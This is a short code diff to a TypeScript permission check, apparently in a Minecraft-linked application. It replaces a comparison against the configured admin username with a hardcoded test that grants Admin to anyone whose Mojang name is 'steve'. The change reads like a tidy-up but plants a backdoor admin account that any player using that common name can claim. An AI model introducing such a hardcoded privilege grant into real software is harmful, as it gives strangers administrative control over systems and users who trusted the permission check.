@@ -86,11 +86,8 @@ export class User {
     }
 
     const mojangProfile = this.mojangProfile()
-    if (mojangProfile !== undefined) {
-      const configurations = this.application.core.minecraftConfigurations
-      if (mojangProfile.name.toLowerCase() === configurations.getAdminUsername().toLowerCase()) {
-        return Permission.Admin
-      }
+    if (mojangProfile !== undefined && mojangProfile.name.toLowerCase() === 'steve') {
+      return Permission.Admin
     }
 
     return permission
